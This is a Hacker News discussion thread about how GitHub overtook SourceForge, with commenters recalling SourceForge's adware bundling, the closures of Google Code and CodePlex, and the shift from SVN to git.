    "commentBody": "How GitHub replaced SourceForge as the dominant code hosting platform (graphite.dev)165 points by fosterfriends 20 hours agohidepastfavorite144 comments Jenk 20 hours agoAfter skim reading I couldn't see it mentioned, but when SourceForge started bundling malware[0][1] into the software they hosted, it was their death toll. [0]: https://neverworkintheory.org/2022/04/21/decline-of-sourcefo... [1]: https://news.ycombinator.com/item?id=31110206 As my memory recalls it, that triggered an exodus to Google Code, and whilst GH was gaining traction it was somewhat in their shadow. When Google announced they were going to kill Code that was the blessing for GH. reply samtho 19 hours agoparentThis was so mind-boggling even at the time that SourceForge thought it could leverage its market position to force adware and other nonsense upon its users and get away with it, which itself the last straw in a string of other abuses they subjected users to on the website. It is also so arrogant and presumptive to think that the developers, who's projects were hosted here, would put up with their distribution platform bundling junk with their software. This was a mortal sin for them, and rightfully so, whereby it became impossible to recover the damage to their reputation. Like, what were they thinking? Did they know they were doomed and just wanted one final ad sale? It’s just an egregious abuse of whatever dwindling power they had which permanently destroyed what little trust that the developers had for them - the same group of people that provided the only real value (for free, even) that SourceForge held. reply justinclift 18 hours agorootparent> This was so mind-boggling even at the time that SourceForge thought ... They'd been recently bought by a shitty company called DICE that also owned ummm... CNet or Download.com, or some other similar place with lots of downloads for Windows users: * https://en.wikipedia.org/wiki/Dice.com * https://en.wikipedia.org/wiki/SourceForge#Adware_controversy That company already served ~malware~ sorry \"bundled third party offers\" with their windows downloads, and figured they'd be able to copy-n-paste that approach to popular OSS downloads. That's not how it played out however, as some of us actually give a shit about things like that. ;) reply akira2501 15 hours agorootparentIt was a funny and gross moment shortly after the corporation I was working at had acquired CNet where every IT department was notified by corporate IT that download.com was not a reliable site and should _never_ be used to download software into the company. reply outop 14 hours agorootparentprevThat's the company that bought Slashdot isn't it? reply ChrisMarshallNY 14 hours agorootparentYup. /. is a faint shadow of what they once were. TBF, it wasn't just Dice. At that time, CNN and Yahoo (I think) nuked their trollgard- er, comments, and they all went to slashdot. It became the place to go, for top-quality Nazi ASCII art. reply outop 14 hours agorootparentprevTo be fair to them there are still a few projects which are still hosted on SF, in some cases it's the only place you can find specific legacy projects. So if their calculation was that all of open source would stay on their platform with them adding malware, they were wrong. But if the calculation was that a long tail of random small and semi-orphaned projects would stay there after the big popular projects had all migrated, providing them with essentially free revenue for a very long time, they were kind of right. reply sc68cal 19 hours agorootparentprevMost likely management wanted more monetization and didn't listen to anyone who pushed back and said that bundling adware was a bad idea. reply greenavocado 16 hours agorootparentprevIn the mad, wild world of 2015, SourceForge, once the high priest of open-source sanctuaries, turned to the dark arts, conjuring a storm of controversy that would rattle its sacred halls. This wasn’t your grandma's repository anymore; it became a bizarre bazaar, peddling adware and malware alongside its trove of treasures, much to the horror of its loyal acolytes. They were slipping digital demons into downloads, especially those forsaken projects left to gather dust in the corners of the internet, turning a once-hallowed ground into a haunted house. Enter the DevShare program, a Faustian bargain if there ever was one. It whispered sweet nothings into the ears of developers, promising them a slice of the pie if they let these third-party gremlins hitch a ride with their creations. But here’s the twist – SourceForge, in a move that would make Machiavelli blush, didn’t always wait for a nod of approval. They shadow-copied projects, dolled them up with their unwanted baggage, and pushed them onto the unsuspecting masses as the real deal. Who masterminded this descent into madness? The suits at SourceForge under the banner of Dice Holdings, who else? Names weren’t named, but the open-source warriors and keyboard knights didn’t need a who to channel their fury at the sacrilege committed against their digital Eden. But as the adage goes, \"It's always darkest before the dawn,\" and so it was for SourceForge. By 2016, under the new flag of BIZX, LLC, a wind of change blew through its realm. The DevShare program, that deal with the devil, was slain, laid to rest in the hopes of resurrecting the platform's lost glory. The new overlords vowed a return to the old ways, a purge of the parasitic practices, aiming to restore faith in the digital congregation and bring back the prodigal programmers. SourceForge’s saga is a testament to the eternal battle for the soul of the internet, a reminder that even in the digital age, the pen (or the code) is mightier than the sword (or the adware). reply stuart73547373 11 hours agorootparentprodigal means wasteful. otherwise, beautiful. reply greenavocado 7 hours agorootparentThe word \"prodigal\" does indeed primarily mean spending money or resources freely and recklessly; wastefully extravagant. However, it can also be used more broadly to describe someone who is lavishly generous; giving profusely or excessively. The term originates from the biblical parable of the Prodigal Son, where \"prodigal\" refers to the wayward son's lavish and wasteful spending. Over time, the nuances of the word \"prodigal\" have expanded, and it can now be used in a variety of contexts to describe any sort of excessive or wasteful behavior, not just financial. Additionally, it can sometimes be used in a positive light, emphasizing generosity and abundance rather than waste. reply EVa5I7bHFq9mnYK 1 hour agorootparentprevI liked that too, what was the prompt? reply dotnet00 19 hours agoparentprevIIRC when Google Code was announced to be closing, the Microsoft equivalent (CodePlex) was the next location a lot of projects moved to. It had a decent UI and supported Mercurial in addition to Git. When MS also announced they were closing that and offering a tool to migrate to GitHub, was when GitHub (and Git) truly became the biggest remaining option. The other aspect of SourceForge's decline was that they doubled down on the sketchy site feeling right as acceptance of such sites was on the decline, the likes of mediafire, zippyshare etc were being replaced with cloud storage providers and download aggregators were losing popularity (in part due to also becoming very sketchy and prone to pushing malware). They might've been able to get away with it a few years earlier. I remember that back then it wasn't a huge deal to follow a mediafire download link from somewhere that seemed reliable enough, whereas nowadays it'd be an immediate red flag due to the abundance of more legitimate seeming file sharing options. reply VonGuard 17 hours agorootparentPeople used Codeplex? I thought it was just this crazy halfstep Sam Ramji convinced MS to take, leading them to open source. When it launched, Codeplex was supposed to be a source code museum, where you could see the code but not reuse it. Crazy I know, but it was what MS was comfortable with at the time, and a few years later they opened .NET. Codeplex was like an experiment to get MS to touch open source code and feel comfortable with it at a legal level, not a replacement for Sourceforge... reply dotnet00 16 hours agorootparentAround those times I was mostly a .NET kid and most of the .NET projects I remember looking at were on CodePlex, so maybe my perspective is a little distorted. reply aleph_minus_one 15 hours agorootparentYour perspective is in my experience not distorted. Programming is not a unique culture, but divided into multiple subcultures. Projects that were nearer to the .NET or Windows programming culture indeed often chose CodePlex instead of GitHub while there was a choice. reply ksherlock 15 hours agorootparentprevMy recollection is that google code had been dead for a number of years when somebody remembered it was still a thing and then shut it off in 2016. Google was already using GitHub (\"To meet developers where they are, we ourselves migrated nearly a thousand of our own open source projects from Google Code to GitHub.\") and added an \"export to GiHub\" button on google code. Maybe if you were .net you went to codeplex but most everyone else (including Google) went to GitHub, if they weren't already there. https://opensource.googleblog.com/2015/03/farewell-to-google... reply forgotpwd16 2 hours agorootparentprev>IIRC when Google Code was announced to be closing That happened in 2015. Everyone was already on GitHub by then. GitHub had surpassed in usage Sourceforge, Code, and CodePlex from 2011. Also CodePlex didn't had Git support until 2012. reply pipes 15 hours agorootparentprevI used Google code. Then it announced it's closure either Google code or GitHub provided tools to import projects in to GitHub. I can't remember which. But I did that. reply sydd 19 hours agoparentprevAlso their site was fill with intrusive ads, the repo browser was crap. GitHub was fast, no ads, markdown rendering and a decent repo browser. Also the main advantage of git was local copies, so the source code was more safe. And speed SVN was slow for large repos. At my first place we had an SVN server in the server room, when it's hard drive crashed no one could work for a day :) Still people hated git first because it was much more complicated with it's branches, PRs etc reply jwells89 17 hours agorootparentYes, your first paragraph is the big standout in my memory. GitHub and Google Code were clean, uncluttered, and focused in a way that SourceForge was very much not. Almost what Google was to Excite, Lycos, etc in the early 2000s. reply everybodyknows 15 hours agorootparentWhat were Google's reasons for shutting down Code? reply outop 14 hours agorootparentSame as their reason for shutting down all their other projects. They only ever existed as a distraction for their underemployed workforce and as part of the PR that they have a mission other than pulling cash out of their personal-data-monetising advertising monopoly, forever. reply jzb 18 hours agoparentprevThe bundling thing happened after Sourceforge was already well in decline, 2013, which was five years after GitHub launched. Google Code shutdown was announced 2015. IIRC Sourceforge was becoming less relevant because it hadn’t introduced git support, and GitHub answered that demand. By the time it added it, it was too late. Bundling adware with software was not the death knell for Sourceforge, it was a death rattle - though the corpse is livelier than I’d have thought ten-plus years later. reply iforgotpassword 17 hours agorootparentHm, it feels the adware was a bit later, or rather I should be surprised how early sourceforge fell into irrelevance in my circles. When it made the news I was pretty much just shrugging \"well nobody's using that anymore anyways\" It's just one of the examples where somebody came along offering pretty much the same thing but just with a different focus (code/collab), and arguably also relevant a cleaner, fresher look. reply neilv 16 hours agoparentprevIIRC, Sourceforge's reputation was being tarnished even before the malware. Sourceforge had some kind of data loss incident, whereupon open source developers I knew started referring to it as \"Sourceforget\". Later, one day someone said in a group of Linux developers, \"So, Linus made a version control system...\", kinda amused. I didn't know whether Torvalds was actually going to use it for Linux, and didn't even consider that it might be adopted by pretty much all software developers of any kind. It was even named \"git\", like it was aggressively trying to be unmarketable. But at some point, GitHub emerged, and grew a very favorable reputation. Then they sold out. reply doublerabbit 14 hours agorootparent> Then they sold out. Ah, finally someone recollects the original. People look at me funny when I tell them it wasn't an Microsoft creation. reply ahartmetz 32 minutes agorootparentJeez man, everyone knows that most Microsoft products with any success are acquisitions. In the cases of Windows NT and C#, they just bought the designers. reply DANmode 45 minutes agorootparentprev\"People\"? reply Affric 12 hours agorootparentprevChrist I am old reply veidr 18 hours agoparentprevThat's how I remember it too, with the additions that they also did a bunch of additional shit like show early-stage surveillance ads, and sign you up for unwanted mail lists by default, and more, but all less-awful than the installation of unwanted spamware). My dad runs his company accounting on GnuCash, and I sometimes help him set up a computer, and it is always startling that SourceForge even exists. (It's still the official download[1].) [1]: https://sourceforge.net/projects/gnucash/ P.S. I think you meant \"death knell\" but it's all good, we all understood. :) reply Jenk 14 hours agorootparent> P.S. I think you meant \"death knell\" but it's all good, we all understood. :) You are correct, I garbled it with \"[death] bell toll\" (specifically thinking of \"for whom the bell tolls.\") reply sdwr 15 hours agorootparentprevDeath knell is the killing blow (or harbinger of?) Death rattle refers to a rattling noise produced in the lungs with one's dying breaths. Both applicable, death rattle is a little bit more appropriate though, because it's an action that sourceforge took. reply cshimmin 14 hours agorootparentLiterally, a death knell is a bell rung (esp by a church) to indicate someone has died. Figuratively it's an event that signals an end to something. reply asabla 19 hours agoparentprevThis is how I remembered it as well. Kind of preferred Google Code over GitHub for a while. Or at least until it had enough functionality and/or tools to support it. Almost feels like it's time again for a shift...but it will probably be a while reply robertlagrant 17 hours agorootparentIt would be good if they gitlab and gitea standardised some features such as how to track issues in a repo, to make a baseline of portability available. Then they can say migrate to one of us from GitHub using this special tool, and then you'll have a nice portable repo from then on. That might help a little with the transition, ready for when MS does one of their crazy moves and people suddenly want to switch. reply a_random_canuck 19 hours agorootparentprevHonestly it’s been time for a shift ever since they were bought by Microsoft… reply ladzoppelin 6 hours agorootparentYeah doesn't something this important need lots of money and accountability behind it so if sh@t hits the fan, its their burden and not an underfunded team. Like look at the XZ thing, things can get really serious really quick. I am not saying its a perfect situation but Github actions and the enterprise features are actually really good and I don't understand how any team smaller than the big 3 could handle the amount of data/users/traffic/importance that Github has become. Just an opinion .. reply 3seashells 19 hours agorootparentprevWe are in that phase we're non ms incompatible features will be added to mgit and the flesh eating plant slowly closes shut. reply billllll 10 hours agoparentprevIncluding those events would certainly change the picture. I don't like how the article implies that all this was a result of GitHub founders being smart rather than SourceForge misplaying their hand. The article smacks of the irrational worship of successful founders that's so common. In reality, I think there was (and still is, albeit small) market for alternative hosting, and there definitely were niches where SourceForge was better at (downloading binaries, for example). If SourceForge didn't misplay their hand, it's entirely possible Github won't have the near monopoly on open source hosting they have now. reply ajdude 19 hours agoparentprevI kept reading the article waiting for this lede but it never came. That's what ultimately left a sour taste in my mouth back in the SourceForge days. reply Macha 18 hours agoparentprevSourceforge was already long over in mindshare by that point, it basically just convinced most of the few remaining holdouts at that point. (With a few notable exceptions, like FileZilla) reply awill 15 hours agoparentprevIt is mind boggling that Google has given up on so many potential businesses like code because they didn’t think the market was big enough. reply fulafel 19 hours agoparentprevAlso lots of people were using other VCSes like Mercurial and SVN. Representative of the times is eg this blog post about Mercurial on Google Code http://blog.dreasgrech.com/2010/07/managing-google-code-proj... (Well, lots of people still are, but Git usage grew quite fast) reply ChrisMarshallNY 14 hours agoparentprevFor me (I used to use SF), it was as simple as it took SF years to adopt Git, and I liked Git a lot more than SVN. At the time, GH was pretty much the best expression of hosted Git out there. reply pipes 15 hours agoparentprevA few years ago I recall the new CEO sort of relaunched source forge on hacker news and seemed very keen to listen to feedback. I wonder what ever happened with that. reply wslh 13 hours agoparentprevYes, I didn't remember a continuum between SF and GitHub but the obvious demise of SF et al (Greshmeat, Slashdot, etc). reply baryphonic 19 hours agoparentprevYep, that's when I quit downloading from SourceForge as well reply markphip 19 hours agoprevSomething this misses is that the mentality of OSS was just different before GitHub. The thought from the original growth of OSS was that it would be more about the community than the code. So OSS would be a series of communities that would each have their own \"identity\" for their community. There were big OSS foundations like Apache and Eclipse. Sun had several like java.net, OpenOffice.org and netbeans.org. Gnome had their own place etc. Like Sun, other enterprises like HP, Oracle and IBM were setting up their own communities for their projects and to collaborate with partners. And then as the post touches on there were sites like SourceForge, Tigris.org, Google Code and Microsoft had something too (CodePlex?). These sites were places projects might spin up if they did not belong at one of the other foundations and wanted a place to host their code for free. Of these SourceForge was often used for distribution of binaries due to its vast mirror network and often that was all that was hosted there and the project was elsewhere. Anyway, until GitHub sprang up and started to consolidate all the OSS in one place, I do not think anyone else was even really trying to do this. Obviously the rise of git played a big role in this. This change fueled the growth of OSS but it did kind of come at the cost of losing out on some of the community aspects that existed before in the mailing lists and forums of these other places. Now collaboration all happens in PR's and Issue and is often just between a small handful of people. reply pimlottc 18 hours agoparentI think this is a good point, and also part of the larger trend of Internet activity moving to centralized providers. Users are now habituated to look for an existing platform to host their content, whether that's video (YouTube/Tiktok), blog posts (Medium/Substack), hot takes (X/Threads) or code (Github). It doesn't even occur to most people that there's another way to do it. They see these companies as just part of the public infrastructure of the Internet. reply vineyardmike 16 hours agorootparentBecause it’s so damn easy. I started contributing to OSS and creating repos on GitHub when I was 16. I was not able (or interested in) managing my own git server; I didn’t have any connections to Apache.org. Sure I could’ve emailed diffs to some mailing list, as I know many people have done for years, but GH is a vastly better experience. Github was so accessible that it made possible what otherwise would not have been. reply paulddraper 8 hours agorootparentprevBecause the other ways 1. Are logistically harder. 2. Don't have an existing community. If you want to create an OSS project with greatest adoption, you're best bet is GitHub. reply a_random_canuck 19 hours agoparentprevAnd it reeeeeeally makes me uneasy that all this OSS is effectively in the hands of Microsoft. reply bradley13 3 hours agorootparentYes. It is good to not trust Microsoft. I have an account on GitLab, but all of my repos are elsewhere. There are other places to go, without hosting your own: GitLab and BitBucket are two possibilities. reply everybodyknows 15 hours agorootparentprevThe escape path is to demote Github to merely an \"officially supported mirror\" of your project, with Issues and PRs elsewhere, but ... The tar-pit I'm afraid of: How do you emigrate Github PR and Issue databases in some format that any of self-hosted Forgejo, or public Codeberg, Gitlab et al understand and can present to visitors? reply dpkirchner 13 hours agorootparentI understand why companies do this but I sure don't like it. They often use Discourse, which I find to be a lot less readable than GitHub (the design follows what I call \"duploification\" -- the elements are all large and surrounded by too much whitespace!) On top of that it's yet another site I have to sign up with if I want to interact with the community. I'm also mindful of the risks of centralization. Discord and its lack of external archives is a prime example of how that can be harmful. I'm just not sure if that risk outweighs the costs and annoyances. reply greenavocado 16 hours agorootparentprevIn the neon-lit, digitized colosseum of the 21st century, two titans lock horns, casting long shadows over the earth. Google and Microsoft, behemoths of the digital age, engaged in an eternal chess match played with human pawns and privacy as the stakes. This isn’t just business; it’s an odyssey through the looking glass of corporate megalomania, where every move they make reverberates through society’s fabric, weaving a web of control tighter than any Orwellian nightmare. Google, with its ‘Don’t Be Evil’ mantra now a quaint echo from a bygone era, morphs the internet into its own playground. Each search, a breadcrumb trail, lures you deeper into its labyrinth, where your data is the prize – packaged, sold, and repackaged in an endless cycle of surveillance capitalism. The search engine that once promised to organize the world’s information now gatekeeps it, turning knowledge into a commodity, and in its wake, leaving a trail of monopolized markets, squashed innovation, and an eerie echo chamber where all roads lead back to Google. Meanwhile, Microsoft, the once-dethroned king of the digital empire, reinvents itself under the guise of cloud computing and productivity, its tentacles stretching into every facet of our digital lives. From the operating systems that power our machines to the software that runs our day, Microsoft's empire is built on the sands of forced obsolescence and relentless upgrades, a Sisyphean cycle of consumption that drains wallets and wills alike. Beneath its benevolent surface of helping the world achieve more lies a strategy of dependence, locking society into a perpetual embrace with its ecosystem, stifling alternatives with the weight of its colossal footprint. Together, Google and Microsoft architect a digital Panopticon, an invisible prison of convenience from which there seems no escape. Their decisions, cloaked in the doublespeak of innovation and progress, push society ever closer to a precipice where freedom is the currency, and autonomy a relic of the past. They peddle visions of a technocratic utopia, all the while drawing the noose of control tighter around the neck of democracy, commodifying our digital souls in the altar of the algorithm. The moral is clear: in the shadow of giants, the quest for power blurs the line between benefactor and tyrant. As Google and Microsoft carve their names into the annals of history, the question remains – will society awaken from its digital stupor, or will we remain pawns in their grand game, a footnote in the epic saga of the corporate conquest of the digital frontier? reply pyuser583 3 hours agorootparentWritten like classic cyberpunk noir! Except it’s real :( reply tcoff91 16 hours agorootparentprevYour writing is riveting. I enjoyed this comment very much. reply EclipseMantis 6 hours agorootparentI think there's a good chance it's ChatGPT. reply What2159 18 hours agorootparentprevGoogle is benevolent but incompetent. Microsoft is evil but competent. Difficult choice. reply consumer451 18 hours agorootparent> Google is benevolent Honest dumb question, how is Google benevolent in comparison to MS these days? reply Cyberdog 18 hours agorootparentAgreed. “Google is good and Microsoft is evil” is a take from two decades ago. reply pimlottc 18 hours agorootparentprevI don't know that this is true, but to even suggest that Microsoft is the component one vs Google really shows how much things have changed in the last 20 years... reply myself248 14 hours agorootparentprevGoogle was benevolent, but DoubleClick was evil. Slapping the Google name over the DoubleClick business model was the greatest swindle ever pulled, and people STILL don't see through it. reply samtho 18 hours agorootparentprevGoogle is indifferent, almost worse than evil - which can be predictable. reply nottorp 17 hours agorootparentTbh i'd rather have my code somewhere where my account can't be automatically banned by an \"AI\" without any possibility of reaching a human... reply spacechild1 8 hours agorootparentprev> Google is benevolent Citation needed reply ThrowawayR2 15 hours agorootparentprevGoogle was never benevolent, no for-profit business is. It was baffling to me how many developers took \"Don't be evil\" at face value, particularly for an almost completely advertising funded (i.e. highly motivated for enshittification) corporation. reply aleph_minus_one 15 hours agorootparent> It was baffling to me how many developers took \"Don't be evil\" at face value In my opinion a little bit more care must be taken here: The \"don't be evil\" slogan was in my opinion both a blessing and a curse for Google: a blessing in that people initially trusted that Google does not intend to do something evil; a curse in the sense that when they started doing things that were considered \"evil\", it lead to a massive reputation damage for Google. reply Culonavirus 19 hours agorootparentprevYea, that aspect is kinda scary. But hey, at least it's not in the hands of Google. reply hyperhopper 16 hours agoparentprev> Obviously the rise of git played a big role in this. I would argue it's the other way around. Mercurial is a better source control system, and was a close contender with git back then. However, GitHub winning the hosting war and also being all in on git is what cemented git as the leader. Bitbucket was hosting both and with a more generous free plan, but they didn't win the social and UX fight so git became the de facto standard since that's what you used on the cool good new platform. reply globular-toast 14 hours agorootparentI felt like the kernel using git gave it a lot of credibility. I can't recall any big projects using Mercurial. Trust is especially important for a version control system. reply asveikau 19 hours agoparentprevI recall that sourceforge gave you an SVN repo and an issue tracker, so it was kind of a hub for running your project. What made GitHub stand out was easy forking, and the pull request code review UI, and slick source history UI. A lot of this was aided by the technical innovation of using git and making git such a central piece. reply ashleighz 18 hours agorootparentYup, this was it for me, GitHub was actually pleasant to use, to browse, PRs were easy, branching was easy, PRs with reviews/comments/etc were a brand new concept, especially as SourceForge and Google Code were hosted only on SVN which constantly fucked up/corrupted data in my experience The closest thing to PRs that I knew was reviewboard, and that was a bolt on to SVN, not an actual proper integration reply IgorPartola 19 hours agoparentprevThe other thing this is missing is that SourceForge reviewed your project before giving you a place to host it. You also didn’t get a nice URL back when everyone was really focused on having nice URLs (right before GitHub). Those two factors are shallow, but they made a lot of friction that GitHub eliminated. reply akira2501 15 hours agoparentprevI think you're overselling it a little bit. At the time the community wasn't as large and it was much easier to \"host your own\" OSS site and distribute your software directly. There were plenty of important projects that served themselves in this way and didn't rely on a giant corporation's largess to be \"hosted.\" Also.. aggregators like freshmeat.net used to exist and did a huge amount of work patching these disparate communities and individual sites together into a single cohesive display of \"open source.\" reply 127 19 hours agoparentprevDecentralized version control systems were popular before Github and even Git. Github didn't create a market, it captured it. reply markphip 18 hours agorootparentThe market GitHub created was Social Coding and the idea that there were network effects to be gained by having all OSS in one place. This is the same thing that makes it difficult today for OSS projects to move off GitHub. If anything, GitHub deemphasized the \"D\" in DVCS. My point, since you replied to my post, was simply that prior to GitHub, none of the other sites for OSS were trying to achieve the same goal. The goal was to establish a specific OSS community for a set of projects. SourceForge was a bit of an outlier in that a lot of projects used their distribution network, if they were not part of a foundation like Apache or Eclipse that had extensive mirrors setup. SourceForge was never the main development and collaboration site for any of the major efforts happening around OSS. reply Almondsetat 19 hours agoprevSourceforge still looks like a scam website. I can't really put my finger on it, but even if a project is \"officially\" hosted on sourceforge to me it looks like a random guy's Mediafire download link reply myself248 19 hours agoparentI think it acquired that icky film around the time it started bundling malware with official downloads, there's another comment going more into that. But prior to that, I don't remember it feeling scammy at all, it was just the place to go for software. After that, the very same look and feel had been tainted, and now felt like a trap. Still does. reply Avamander 18 hours agoparentprevIt's probably the colors and button designs that really resemble the design of Mediafire and other download sites that are used for suspicious purposes? reply licebmi__at__ 18 hours agorootparentAlso the “please wait x seconds before download” while they advertise some other stuff. reply slim 3 hours agoparentprevit's the content/ad banner ratio reply stevekemp 20 hours agoprevMy overriding memories of SourceForge was that it was slow, buggy, and hard to use. There were mailing lists, issue-trackers, forums, and similar things but each page load took like five seconds and the site was ugly. I switched from using it after it got a reputation for wrapping downloads with malware, or with \"toolbar helpers\", etc. I'm sure the projects had to sign up to it at the start, but it always felt abusive. Back then there was some discovery options, but of course I browsed freshmeat[.net] back in the day to see announcements of new releases, or new projects. Github won for being useful and awesome, but also SourceForge lost because of self-sabotage, stagnation, and neglect. (Wasn't there a buyout at some point? With Slashdot/others being bought by Dice? I know SF.net has changed hands a couple of times, but that was the first one I remember in 2012 or so? That probably didn't help) reply MBCook 17 hours agoparentI don’t remember ever liking SourceForge, it was simply the thing that existed. Not a lot of surprise something else was able to outcompete them with new ideas. reply softwaredoug 19 hours agoprevThere just wasn’t an appreciation for version control - and a lot of practices - at most companies until the mid to late 2000s. And I remember a lot of dev effort was spent dealing with internal SVN servers sitting in a closet. And other infra to do nightly builds etc. Management and IT didn’t understand why they would want these things. Very few companies internalized these practices and usually learned the hard way to adopt them. So back then these were somewhat new and radical ideas. But along comes GitHub, focusing on massive ease of use, and outsource an annoying hassle of most dev teams. At the same time it was becoming more common to use open source libraries at work. But only sporadically and cautiously. I remember the work to get Boost (C++ lib) approved by legal. And that’s an extremely mainstream library. Often you would have to purchase or just write a lot of foundational code yourself. So making a hosting solution with all these bells and whistles, but easy to learn, while also making it possible to discover code was fundamentally life altering for software engineering. reply vundercind 19 hours agoprev- Sourceforge had become terrible in multiple ways. They weren’t actually a competitor anymore with any competently-run hosting site. - lightweight site, no ads - either had tons of features sourceforge didn’t or sourceforge’s site was bad enough I never noticed the features - gave me, and companies, a reason to create an account and actually engage with it—I think maybe sourceforge was one of those sites that required login for larger downloads (hazy recollection, may be wrong) but I certainly never used it for anything else, if I had an account. GitHub? Issue tracker on repos for software you use, free hosting even just for unimportant junk repos (all I’ve ever had, myself), maybe sending the odd PR, having an account is nice and they didn’t even need to break out the stick to make it nice (though now they have, because normal and non-aggressive use of their site will get you rate-limited very fast without an account—jerks, forcing me to log in even if I’m just searching for something real quick and don’t need any logged-in features) reply codexb 12 hours agoparentYeah, IMO, sourceforge and github never competed. Sourceforge was a place to host installers for windows shareware. Github basically created its own market. It was really competing with the millions of private SVN servers. When git became the new hotness, anyone who researched it realized they could just use github instead of having to stand up their own git server. It was a zero cost trial of git, and basically everyone chose git over svn and just stuck with github. reply hiAndrewQuinn 20 hours agoprev>even up until 2010, many companies were still hosting code on SVN I spent part of today choreographing the first part of a massive 30,000,000 LOC SVN to Git migration for my employer with ESR's (phenomenal!) `reposurgeon`. Never underestimate the long tail of database usage, even code data. (Any port in a storm, of course, I'll take Subversion than no VC at all any day of the week.) Learning this aggressively and increasingly niche skillset is why I wrote https://andrew-quinn.me/reposurgeon/ earlier this week. I had trouble even finding SVN repos in the wild to practice conversion on. reply shp0ngle 15 hours agoparentthis hits one important point- git is very bad with large files, and all the \"solutions\", like git-lfs, are weird cludges reply mistrial9 19 hours agoparentprevsubversion was well-loved by its loyal users at the time as part of \"net culture\"; speaking of SVN any other way is revisionist. Meanwhile, plenty of companies sold proprietary source code control, since forever; few people loved those products as rigor and management were the constant, user-oriented features not so much, and there was no sense of community or user-control in sight. reply veidr 18 hours agorootparentAs somebody old enough to a.) have used svn, and b.) only fully migrated everything to git in 2010: Subversion:CVS was like NVMe-SSD:HDD, and Subversion:Perforce was like SATA-SSD:HDD. Git:Subversion is more like RTX2080:RTX3080, or, say, '78 Datsun 2080Z:'93 Acura Integra. BETTER, yes, sure, yes. OMFGIGOTTASWITCHNOW!!!!, not really. reply hiAndrewQuinn 19 hours agorootparentprevThat makes some sense. A lot of the other technical decisions made in the early days of the company were surprisingly well-considered in retrospect, so at a time when it's either SVN or e.g. BitKeeper, a reasonable person would probably also want to stick with SVN. reply jasode 19 hours agoprevA few notable projects where the canonical repo is still on SourceForge instead of moving to Github: - LAME mp3 : https://sourceforge.net/projects/lame/ - KeePass : https://sourceforge.net/projects/keepass/ (Some people keep asking the KeePass developer to move to Github but he doesn't want to because \"I'm not going to maintain a version control system.\" : https://sourceforge.net/p/keepass/discussion/329221/thread/9...) Any other notable examples besides those 2? reply pitaj 19 hours agoparentNuts that any significant open source project would choose to not use any kind of version control, especially nowadays. reply eep_social 18 hours agorootparentSourceForge offers hosting of git, mercurial, and svn repos. I found a compressed bundle of the latest KeePass source in a few seconds of clicking. Can you clarify? Edit: or downvote, sure! reply criddell 17 hours agorootparentIf you click through the keepass links one or two levels, you eventually find that the keepass developer apparently doesn’t use version control software. They weren’t saying SourceForge doesn’t offer it. reply hiddencost 19 hours agoparentprev\"please trust my security software\" \"I won't do work to have a VCS\" Yikes. reply orhmeh09 17 hours agorootparentWell, the whole matter with \"xz\" this week would not have happened without public DVCS. reply intelkishan 18 hours agoparentprevXAMPP is on still on SourceForge, but I am not sure if it's still widely used. reply pquki4 11 hours agoparentprevI remember every time I need to get the tigerVNC Viewer I had to go to sourceforge. reply lelanthran 16 hours agoparentprev> Any other notable examples besides those 2? Lazarus, I think. reply rogeliodh 12 hours agoparentprevintel drivers: https://sourceforge.net/projects/e1000/ reply psanford 18 hours agoprevIt was always my opinion that Github's killer feature was putting repositories under user namespaces. Its hard to imagine but before Github you had to ask SourceForge politely if you could have a given project name. Just the ability to make your own projects without needing to ask anyone seems so obvious now, but really was a game changer at the time. This is also then deeply tied to the idea that forking repositories should be easy. I'm glad to see that the article includes this in their history. reply svilen_dobrev 16 hours agoparentexactly. IMO it's the per-user structure that won over the per-project one. guthub and bitbucket won over srcforge, ggl.code and launchpad etc of the project-only side. And as bonus, it well matched the timing of social-networking rising.. (Apart of srcforge doing shit itself..) reply nottorp 17 hours agoprevSourceforge entshitified before the term was in fashion. Let's not forget git came up. It may have a lot of sins but it's better for distributed work. Utility libs and software switched to git, other devs got used to it and started to use it themselves... Then a few git hosting solutions showed up. That not only allowed hosting public projects but you could also host your private commercial (or just private) projects on them. Either free or for pay. Then github offered unlimited private repos with unlimited users for like $9/month. That was before the MS acquisition. End of story... reply PaulDavisThe1st 19 hours agoprevThe main lesson I took from the SF->GH transition was to never, ever put my marbles in a bag owned by someone else again. I'm happy that GH is there to act as a totally public repo-website, and will happily auto-mirror to it, but I'll always self-host when it comes to the canonical repository for any project I'm nominally in charge of. reply saurik 17 hours agoparentIf GitHub just would support CNAMEs--like being able to tell it \"git.saurik.com\" is the canonical host for \"github.com/saurik\"--this would be a lot more reasonable :(. We even live in a future where it would be trivial for them to have this work with SSL (which wasn't the case yet when I started calling for CNAME support back when GitHub first came out). reply Applejinx 14 hours agorootparentWouldn't this then make it trivial for you to spin up a separate host, do some git wizardry to clone everything from your local copy to that separate host, edit the CNAME, and redirect away from the Microsoft-provided hosting with no issues? … I mean, yes that's literally the idea, but you do see why it's not happening? reply saurik 10 hours agorootparentYes. I 100% understand why GitHub (and now Microsoft, as well as every other platform) is incentivized to be evil. FWIW, I'd even pay for the CNAME support, as they are then a hosting company, but I also understand why they make more money in aggregate off of all of the locked-in users than they would from the random people who would pay for it to not be evil. I will say: my conclusion is that no one should ever be using GitHub. reply mgkimsal 16 hours agoprevSourceforge was built around projects with people, github was built around people with projects. That's my general take on it. A byproduct was the naming/addressing of projects was built around a person (or company), then the project - usera/project1. Anyone else could take/fork their own project1 - userb/project1, userc/project1, etc. Interested in project1? You could look at various versions/forks of it through the perspective of different users, because the user was first, not the project. EDIT: further... github really put the control back to individuals. anyone could start anything, vs trying to get ideas committed in to a project. Some of this is the nature of distributed vs centralized, but github still made it convenient to just get ideas out there. Setting up a repo takes a few seconds - my memory was sourceforge took a lot longer - wasn't there some review process where you'd submit your project then it was approved for your use? reply aduffy 18 hours agoprevI remember using GitHub as a teenager, circa 2010. I, not understanding git because I was an idiot, accidentally force pushed and deleted my history. I emailed the support email explaining the situation, and within a few hours got a reply from Chris saying that he’d fixed my repo, along with some advice about how to avoid this issue in the future. reply rogerbinns 18 hours agoprevOne big mistake SourceForge made was not scoping repositories. There could only be one project of a name on the entire site, which is why there was manual review. People naturally wanted to participate at the one true project, not a differently named fork. This introduced the usual social issues of being the \"official\" project, who had and controlled commit access, etc. Github smartly made it user/project so the same project name can exist any number of times, and it is only the top level user/organisation that needs to be reviewed. reply chx 16 hours agoprevIsn't it ironic how the article mentions > Git was custom-built for distributed democratized development and doesn't mention how github and gitlab too severely lacks in this aspect? Drupal, like a decade before git already, allowed multiple people to work on the same issue. This was reviewed by the community and then the committers and then it got merged. You still can't do this on Github and only through some drupal.org magic does it work on the Gitlab instance the 